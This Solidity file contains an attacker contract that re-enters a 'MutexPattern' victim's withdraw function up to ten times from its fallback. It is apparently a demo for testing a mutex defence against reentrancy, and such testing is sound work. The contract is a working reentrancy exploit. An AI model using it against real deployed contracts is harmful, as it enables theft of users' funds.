pragma solidity ^0.7.0;

import './MutexPattern.sol';

contract AttackerMutex {
  MutexPattern v;
  uint256 public count;
  uint amount = 1 ether;
  address public victims_address;

  event LogFallback(uint c, uint balance);

  constructor (MutexPattern victim) {
    victims_address = address(victim);
    v = MutexPattern(victim);
  }

  function set_balance () public {
     victims_address.call{value: amount}("");
  }

  function attack () public {
    v.withdraw(amount);
  }

  fallback () external payable {
    count++;
    emit LogFallback(count, address(this).balance);
    if (count < 10) {
      v.withdraw(amount);
    } 
  }
}